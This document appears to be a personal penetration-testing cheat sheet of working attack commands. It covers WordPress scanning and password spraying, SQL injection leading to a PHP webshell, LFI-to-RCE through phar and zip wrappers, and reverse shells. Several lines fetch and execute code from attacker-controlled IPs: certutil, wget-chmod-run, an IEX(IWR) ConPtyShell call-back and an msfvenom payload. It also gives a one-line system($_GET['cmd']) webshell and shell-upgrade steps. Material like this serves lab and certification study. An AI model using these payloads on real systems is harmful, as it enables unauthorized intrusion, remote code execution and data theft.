# Wordpress
- Juicy file: ``` wp-config.php ```
- enumerate vulnerable plugins, users, vulrenable themes, timthumbs, plugins
``` wpscan --url {url} --detection-mode aggressive --plugins-detection aggressive -e ap,at ```

``` wpscan --url {url} --enumerate {vp,u,vt,tt,p} --plugins-detection {mixed, aggressive, passive}```
- Enum plugins & themes for vulns, with reading source code of the webpage (href=?)
- Possble to use hashcat reverse hash (Not suggest)
## Wordpress authenicated admin to RCE
- https://medium.com/@akshadjoshi/from-wordpress-to-reverse-shell-3857ee1f4896
## password attack
- ``` wpscan --url {url} --usernames "hoidam" --passwords /usr/share/wordlist/rockyou.txt -t 100 --password-attack wp-login ``` 


# Non wordpress php
- Check script if have sqli
- Add ``` ' ``` or ``` " ``` to all param to test if can sqli
- check what dbms it is by time-based payload generic ![alt text](image.png)
- Grab nc.exe if the WINDOWS system dont have:
  ``` certutil -urlcache -f http://192.168.45.182:80/nc.exe c:/windows/temp/nc.exe ``` 

  then use the nc.exe (w/ path) to run

1) Find sql injectable input
2) Use an ORDER BY query to determine the number of columns in the vulnerable parameter.
3) To find the correct column, you can test the "@@version" payload for each column to check if you are retrieving the database version.
4) Inject a simple php webshell payload using a "union select" query and "into outfile" write the webshell to the /var/www/html directory.
5) Access the webshell for RCE and execute commands on the server.

# Genearting other reverse shell 
- e.g. exe format
  ``` msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.225 LPORT=4444 -f exe> shell.exe ```

# FTP
- Anonymous ftp user ``` anonymous ``` user name to login & input random password can login 
- [Anonymous] Check if can put files!
- use binary mode ``` binary```
- ``` ftp -A ``` to use active mode
- disable passive mode to prevent entering extended passive mode error
  ``` epsv4 off ```
  ``` passive ```
- get all ``` mget * ```
- Default path in OS: ``` /var/ftp ``` 
## SSL
- ``` ftp-ssl -z secure -z verif=0 -p {ip} ```

# Landing issue
1. sometimes rmb spawn ANY shell since ssh not support stdin e.g. ``` python3 -c 'import pty; pty.spawn("/bin/bash")' ```
2. let you can use arrows and short keys: ``` rlwrap {commands} ``` e.g. nc lvnp , smbclient , etc

# Built-in web shell library in kali
- ``` find / -name nc.exe 2>/dev/null ```

# Apache server
- start: ``` sudo systemctl start apache2 ```
- check log: ``` tail -f /var/log/apache2/access.log ``` (see if have request / success?)

# Git 
- Show any staged code ``` git status ```
- show changes ``` git show {commit_id} ```
- show log ``` git log ``` (reading logs head)
## Git Tools
- https://github.com/internetwache/GitTools?tab=readme-ov-file
- https://github.com/arthaud/git-dumper (BETTER)
### Git Dumper:  
1. ``` ./gitdumper.sh {ip} {store path}```download as much as possible from the found .git repository from webservers which do not have directory listing enabled
2. ``` git checkout -- .``` Restore file via git
### Git Commit in victim server
1. pull git folder ```GIT_SSH_COMMAND='ssh -i private_key_file -o IdentitiesOnly=yes' git clone user@host:repo.git ```
2. add/edit file 
3. ``` git add -A  ```
4. ```  git commit -m "pwn"  ```
5. ``` GIT_SSH_COMMAND='ssh -i {git-id_rsa} -p 43022' git push -u origin ```


# Simple networking
1. 127.0.0.1 = loopback = only host can call | 0.0.0.0 means all traffic ok

# SSH 
1. SSH too open: https://stackoverflow.com/questions/9270734/ssh-permissions-are-too-open ``` chmod 600 ``` or ``` chmod 400 ```
2. If u think password correct but still denied then related to ssh key, find it !
3. Sudoer file explained:
   ```
    /etc/sudoer: 
      (m.sander) /usr/bin/sync.sh
   ```
    - Means that the user t.tyler has sudo privileges to run the script /usr/bin/sync.sh as the user m.sander.
4. Sudo command run as other user
    ```
      t.tyler@/tmp: sudo -u m.sander /usr/bin/sync.sh 
    ```
    You should enter """t.tyler""" password
5. PrivEsc (ssh ing within the same machine)
   - https://stackoverflow.com/questions/75890387/ssh-too-many-authentication-failures 
   - TDLR ``` ssh -i root root@127.0.0.1 -o IdentitiesOnly=yes ```

# Netcat 
1. Sometimes have firewall, not all service can nc (e.g. available services already using ,50000 <- want fuck this? 18000 service also on. we can impersonate this port)
## Connect a bind shell
- ``` nc -nv {ip} {port} ```

# IMAP 
- GUI : Thunderbird , account name: ``` {username}@localhost ```, host = ip 
- Careful attachment
1. connect to the server ``` nc 192.168.244.140 143 ```
2. Login w/ usrname& pwd ``` tag login jonas@localhost SicMundusCreatusEst ```
3. Some useful func  
    ```
        tag SELECT INBOX
        tag STATUS INBOX (MESSAGES)
        tag fetch 1 (BODY[1])
        tag fetch 2:5 BODY[HEADER] BODY[1]
    ```

# Interactive shell for Windows!
- https://github.com/antonioCoco/ConPtyShell
## From Webshell 
It's important to have the same rows and cols size between your terminal and the remote terminal if you want to have an aligned output on the shell.
## Fix shell
1. if command not found: ```set PATH=%PATH%C:\Windows\System32;C:\Windows\System32\WindowsPowerShell\v1.0; ```


#### Method 1
In this method the terminal size is set without you pass the rows and cols parameters to Invoke-ConPtyShell function:

##### Server Side:
```
stty raw -echo; (stty size; cat) | nc -lvnp 3001
```

##### Client Side:

```
IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.0.2 3001
```

## Upgrade shell to interactive
- https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
- TDLR: 
  ```
  # In reverse shell
  $ python -c 'import pty; pty.spawn("/bin/bash")'
  Ctrl-Z

  # In Kali
  $ stty raw -echo
  $ fg

  # In reverse shell
  $ reset
  $ export SHELL=bash
  $ export TERM=xterm-256color
  $ stty rows <num> columns <cols>
  ```

# OpenVPN
- avoild collision: add ``` mssfix 1400 ``` to openvpn file

# DNS 
- DNS Zone transfer
- https://yogesh-verma.medium.com/zone-transfer-attacks-a-practical-guide-to-detection-and-prevention-2e8346d0297e
- Only works in tcp

# LDAP
1. LDAPsearch (kali)
- ``` ldapsearch -h {host} -x -b "DC=??,DC=local" '(objectClass=User) samaccountname | grep samaccountname | awk '{print $2}' ``` Get user list | remember remove obviously not using account e.g. Guest, system account
## Interesting Thing
- Look for 'info' field (some people will lazy put shared password there)

# Php
## PHP Wrappers
- some uncommon method
    1. ``` php://filter ```
    2. make command base64 ``` <?php echo system($_GET["cmd"]);?> ```
    3. insert ``` data:// ```
## Advanced PHP Bypass (Apache)
- not just using filetype alternatives
1. upload htaccess with this ``` echo "AddType application/x-httpd-php .dork" > .htaccess ```
2. upload shell.dork with reverse shell content (maybe Ivan Sincek?)
## phpinfo.php
- Look for interesting info e.g. $_DOCUMENT_ROOT (can inject files to the dir)
- Look for disabled command (search disabled) --> ** dfunc_bypasser may helps **
- Look for extensions all sub item version below (e.g. SFX .4 that exploit)
## Arbitary Read by LFI & php://filter Wrapper
- php wrapper: ``` http://192.168.69.69/{file/view/others...}=php://filter/convert.base64-encode/resource={index/home/../../../../../../../../etc/paaswd}  ```
## using phar to smuggle php for LFI -> RCE
- https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters
1. write shell in shell.phar
2. ``` zip shell.phar {any type that bypass checking}```
3. running call in LFI e.g. ``` phar://directory/shell.phar/shell ```
## using zip to smuggle php for LFI -> RCE
- https://rioasmara.com/2021/07/25/php-zip-wrapper-for-rce/?source=post_page-----b49a52ed8e38--------------------------------
1. ``` upload zip with cmd.php ``` to victim
2. run ``` index.php?file=zip://uploads/upload.zip%23cmd&cmd=id ```

# SMB 
1. first enum ``` smbclient -L //{ip} --option="client min protocol=core" -U '' ```
2. List shares: ``` smbclient -L \\{IP}\ -N ```
3. Connect to share ``` smbclient \\\\{IP}\\{share} -U '{domain}\{username}%{password}' ```
## Get/Download all files
```
  mask""
  recurse ON
  prompt OFF
  mget *
```

## setuserinfo
- modify user ac info
```
  Level 0: Basic information, such as username and full name.

  Level 1: Additional information, including home directory, script path, and profile path.

  Level 2: Further information, like password age, privileges, and logon script.

  Level 3: Detailed information, including all the above and group memberships.

  Level 4: Even more detailed information, including all the above and security identifier (SID).
```

## Python2
1. RCE in input() ```__import__('os').system("bash") ```

# Curl
- sometimes try to remove http:// if cant curl or wget
## Alternative:
- wget
### Oneliner 
- ``` wget 192.168.45.176/bash.sh -O /tmp/bash.sh && chmod +x /tmp/bash.sh && /tmp/bash.sh  ```

# Handling multimedia
- e.g. pdf
- ``` file {file} ```
- ``` strings {file} ``` check useful/hidden info e.g. username password etc. 